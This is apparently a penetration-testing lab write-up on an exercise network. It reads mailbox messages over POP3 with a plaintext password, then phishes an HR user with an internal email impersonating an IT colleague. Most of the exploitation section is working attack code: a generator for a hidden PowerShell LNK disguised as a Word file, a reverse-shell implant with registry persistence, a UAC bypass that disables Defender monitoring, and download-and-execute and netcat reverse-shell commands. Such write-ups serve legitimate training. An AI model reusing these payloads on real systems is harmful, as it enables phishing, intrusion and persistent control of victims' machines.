## ENUMERATION

After reaching the lab's primary objective — recovery of the fraudulent transfer code from GCB — an additional enumeration phase was conducted to identify further access vectors within the infrastructure.

Host `10.200.11.33` was identified exposing multiple ports associated with email services. The presence of SMTP (25), POP3 (110), and Submission (587) indicates the system is acting as a mail server or relay.

```powershell
.\nmap.exe -Pn -n -p- 10.200.11.33 --open

PORT    STATE  SERVICE
25/tcp  open   smtp
110/tcp open   pop3
587/tcp open   submission
```

POP3 allows direct mailbox access with valid credentials.

#### 1. POP3 Authentication

Using previously obtained credentials for `FINANCE\vanessa`, a direct connection to the POP3 service is established via `ncat`.

```powershell
.\ncat.exe 10.200.11.33 110
```

#### 2. Mailbox Enumeration

Authentication is performed with `vanessa@gcbfinance.example` credentials. The `LIST` command enumerates stored messages.

```powershell
USER vanessa@gcbfinance.example
PASS 300YearsAndStillG0ing$trong
LIST

+OK 5 messages (5499 octets)
1 727
2 1247
3 906
4 1190
5 1429
```

#### 3. Message Retrieval

POP3 `RETR <ID>` retrieves full message content, exposing credentials, sensitive information, or operational context.

```
retr 1
retr 2
retr 3
retr 4
retr 5
```

#### Message Summary

```
📩 Message 1
"Hello there ;)"

Guess who has a gcbfinance email ;)
I got Romi from IT to set up this private mail server for us and others in the group.
Use it for informal things, not for official business.

📩 Message 2 (Reply)
Romi told me it's routed from the official server (and other technical things I didn't listen to 😅).
But you can still send me compressed files (ZIP).

📩 Message 3 (Reply)
Better use the official email for that.
By the way, do you know why the timestamp on your emails shows midnight?

📩 Message 4 (Reply)
Let me ask Romi.

📩 Message 5 (Reply)
He gave me a technical reason.
Also warned me not to tell anyone else about it.
I guess it's a secret between us 😄.
```

#### Findings

- Mail server: `HR-MAIL` (identified via `by HR-MAIL with ESMTPA` header)
- Service type: internal SMTP/POP3
- Sending user: `erika@gcbfinance.example`
- Receiving user: `vanessa@gcbfinance.example`
- Client host sending email: `hr-erika (10.200.11.24)`
- Mail server host: `10.200.11.33 (hr-mail.gcbhr.example)`
- Primary domain observed: `gcbfinance.example`
- Additional domain: `gcbhr.example`
- A private mail server configured outside official infrastructure (Shadow IT) is mentioned
- Setup attributed to `Romi` from IT
- ZIP file transfers are enabled through this server
- The service is explicitly described as informal and kept confidential

#### Shadow IT Identification

The email chain indicates a privately deployed mail server operating outside formal IT controls — a classic Shadow IT scenario. From an offensive perspective, Shadow IT infrastructure typically lacks centralized monitoring, proper access controls, activity auditing, and corporate security policies. These services are routinely exploited as entry points or pivot points within the environment.

Key indicators:
- Explicitly private mail server
- Deployed by an IT employee without formal approval
- Used for informal communications outside official channels
- Confidentiality requested — not reported to management
- ZIP transfers enabled — potential channel for data exfiltration

## ATTACK CHAIN

Access to `HR-MAIL` via POP3 → Shadow IT infrastructure identified (users `erika` and `vanessa`) → `HR-ERIKA` compromised via LNK phishing → lateral movement to a new domain

## EXPLOITATION

The previously identified email infrastructure (`HR-MAIL`) and the Shadow IT context are used as a platform for internal phishing targeting `hr-erika`. The attack abuses the identified communication channel to deliver a malicious LNK payload.

Attack elements:
- Identity impersonation of IT user `Romi`
- HR-MAIL SMTP server used for delivery
- Malicious LNK inside a ZIP archive
- PowerShell reverse shell hosted on the operator's server

### 1. Generate the Malicious .LNK Payload

`Create-LNKPayload` generates a `.LNK` shortcut that executes PowerShell silently, downloads a script from the operator's server, and runs it without user-visible windows. The file is disguised with a Microsoft Word icon to increase the likelihood of execution.

```powershell
function Create-LNKPayload{

    [CmdletBinding(DefaultParameterSetName = 'None')]
    param(

    [Parameter(Mandatory=$True)]
        [String]
        $LNKName,

        [Parameter()]
        [String]
        $TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",

        [Parameter()]
        $IconPath = 'C:\Program Files\Internet Explorer\iexplore.exe',

        [Parameter(Mandatory=$True)]
        [String]
        $HostedPayload

    )

     if($LNKName -notlike "*.lnk"){
        $LNKName = '\' + $LNKName + ".lnk"
     }elseif($LNKName -notlike 'C:\*'){
        $LNKName = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath('.\') + '\' + $LNKName
     }

     $payload = "PowerShell.exe -WindowStyle Hidden -Command '& {Invoke-WebRequest -Uri 'http://10.200.5.15/update.ps1' -OutFile 'C:\Users\Public\update.ps1'}'; cmd /c start /min PowerShell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File 'C:\Users\Public\update.ps1'"
     $encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
     $finalPayload = "-nop -WindowStyle Hidden -enc $encodedPayload"
     $obj = New-Object -ComObject WScript.Shell
     $link = $obj.CreateShortcut($LNKName)
     $link.WindowStyle = '7'
     $link.TargetPath = $TargetPath
     $link.IconLocation = $IconPath
     $link.Arguments = $finalPayload
     $link.Save()
}
```

> Run from the operator's PowerShell session.

### 2. Create the LNK File

```powershell
Create-LNKPayload -LNKName .\data.lnk -IconPath 'C:\Program Files (x86)\Microsoft Office\root\Office16\winword.exe,1' -HostedPayload 'payload'

# Result: data.lnk

# Compress for email delivery
Compress-Archive .\data.lnk -DestinationPath data.zip
```

- `Create-LNKPayload` — generates the malicious shortcut
- `-LNKName .\data.lnk` — output file name
- `-IconPath '...\winword.exe,1'` — disguises as a Microsoft Word document
- `-HostedPayload 'payload'` — points to the remote resource

> The file appears to be a legitimate document but silently executes PowerShell and downloads the remote payload on click.

### 3. PowerShell Implant (update.ps1)

```powershell
# Attacker host IP (IT-EMPLOYEE15) — where the victim connects back
$address = '10.200.5.15'
# Listener port
$port = 80 
# URL of the hosted PowerShell payload
$scriptURL = 'http://10.200.5.15/update.ps1' 
# Registry key name for persistence
$autorunKeyName = "Windows Powershell" 
# Autorun value — downloads and executes the payload silently on logon
$autorunKeyVal = 'powershell -WindowStyle Hidden -nop -c "iex (New-Object Net.WebClient).DownloadString(''' + $scriptURL + ''')"' 

# 1. Persistence — add to HKCU Run key
$autoruns = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
if (-not $autoruns.$autorunKeyName) {
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
}
elseif($autoruns.$autorunKeyName -ne $autorunKeyVal) {
    Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
}

while ($true) {
    # 2. Callback — outbound connection to operator server
    do {
        try {
            Write-Host "Trying to reach "$address":"$port
            $client = New-Object System.Net.Sockets.TcpClient($address, $port)  
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            break
        }
        catch {
            Start-Sleep -s 10
        }
    } while ($true)
    
    Write-Host "Connected"
    # 3. Remote execution — receive and run commands
    try {
        do {
            $cmd = $reader.ReadLine()
            if ($cmd -eq 'exit') {
                Write-Host "Exiting"
                break
            }
            try {
                $output = [string](iex $cmd)
            }
            catch {
                $output = $_.Exception.Message
            }
            $writer.WriteLine($output)
            $writer.Flush()
        } while($true)
    }
    catch {
        Write-Host $_.Exception.Message
    }
    
    # Cleanup
    $writer.Close()
    $reader.Close()
    $stream.Close()
    $client.Close()
}
```

| Phase | Description | Objective |
| --- | --- | --- |
| 1. Persistence | Adds a key to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Execute automatically on logon |
| 2. Callback | Outbound connection to the operator's server | Establish command channel |
| 3. Remote execution | Receives commands and returns output | System control |

```powershell
ls
# data.lnk
# update.ps1
# data.zip
```

### 4. Payload Validation

Before phishing, the implant is manually tested to confirm the communication channel works:

```powershell
# Start listener
.\nc.exe -lnvp 80

# Execute the script locally
.\update.ps1

whoami
# it\itemployee15
hostname
# IT-Employee15
```

> At this stage only `update.ps1` is tested directly — `data.lnk` is not yet involved.

### 5. Phishing Delivery Preparation

```powershell
# Host update.ps1 via HTTP
.\python.exe -m http.server 80 --bind 0.0.0.0

# Deliver payload via internal SMTP
Send-MailMessage -From "Romi<romi@it.gcb.example>" -To "erika<erika@gcbfinance.example>" -Subject "Your mailbox is alive" -SmtpServer 10.200.11.33 -Attachments .\data.zip

# Start listener for incoming connection
.\nc.exe -nlvp 80
```

Email characteristics:
- Sender impersonated: `Romi <romi@it.gcb.example>` (IT identity)
- Recipient: `Erika <erika@gcbfinance.example>`
- SMTP server: `10.200.11.33` (HR-MAIL)
- Attachment: `data.zip` containing the malicious LNK
- Scenario: internal phishing with IT identity impersonation

> Port 80 is used for both serving the payload (HTTP) and receiving the reverse shell. The retry loop in the implant (`Start-Sleep -s 10`) allows the operator to first serve the payload via HTTP and then switch the same port to a listener — the implant reconnects on the next retry.

### 6. Payload Execution and Initial Access

Once the victim extracts the archive and opens the `.LNK`, the payload downloads and connects to the listener:

```powershell
whoami; hostname
# hr\erika
# hr-erika
```

Remote execution on `hr-erika.gcbhr.example` confirmed under the context of user `erika`.

### 7. UAC Bypass for Privilege Escalation

Access is initially limited to `hr\erika` (standard user context). UAC prevents running elevated processes directly. A UAC bypass is used to execute commands with elevated privileges without user interaction.

```powershell
# Transfer nc.exe to the compromised host
Invoke-WebRequest "http://10.200.5.15/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"

# Confirm
test-path C:\Windows\Temp\nc.exe
# true
```

UAC Bypass script (`Bypass-UAC.ps1`):

```powershell
function Bypass-UAC{
	[CmdletBinding()]
	param([string]$payload='cmd.exe')

    $ver = [System.Environment]::OSVersion.Version.Major
	$key = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
	$uac = Get-ItemPropertyValue -Path $key -Name ConsentPromptBehaviorAdmin

	function Add-RegKey([string]$key, [string]$exploit, [string]$payload='cmd.exe'){
		$regPath = "HKCU:\Software\Classes\$key\shell\open\command"
		New-Item $regPath -Force
		New-ItemProperty $regPath -Name "DelegateExecute" -Value $null -Force
		Set-ItemProperty $regPath -Name "(default)" -Value $payload -Force
		Start-Process $exploit
		Start-Sleep -s 5
		Remove-Item $regPath -Force -Recurse
	}

	if ($uac -eq 2) {
		$UAC_LEVEL = 'High'
	} elseif ($uac -eq 0) {
		$UAC_LEVEL = 'None'
	} elseif ($uac -eq 5) {
		$UAC_LEVEL = 'Default'
	} else {
		$UAC_LEVEL = 'Unknown'
	}

	if ($UAC_LEVEL -eq "High") {
		exit
	} elseif ($UAC_LEVEL -eq "None") {
		Start-Process -FilePath $payload -verb runas
	} else {
		if ($ver -eq 10) {
			Add-RegKey ms-settings ComputerDefaults.exe $payload
		} else {
			Add-RegKey mscfile CompMgmtLauncher.exe $payload
		}
	}
}
Bypass-UAC 'powershell -ep bypass -c "Set-MpPreference -DisableRealTimeMonitoring 1"'
```

The technique:
- Creates a controlled registry key under `HKCU:\Software\Classes\...`
- Defines a command handler via `DelegateExecute`
- Invokes a legitimate auto-elevated binary (e.g., `ComputerDefaults.exe`)
- Executes the payload in an elevated context without a UAC prompt

### 8. Execute UAC Bypass and Get Elevated Shell

```powershell
# On the compromised host — execute bypass
IEX (New-Object Net.WebClient).DownloadString("http://10.200.5.15/Bypass-UAC.ps1")

# On the attack host — start listener
.\nc.exe -lnvp 80

# Create and start a service to spawn elevated reverse shell
Bypass-UAC 'cmd /c sc create ada binPath= "cmd /c C:\Windows\Temp\nc.exe -e cmd 10.200.5.15 80"'
Bypass-UAC 'cmd /c sc start ada'
```

> If the connection drops, retry.
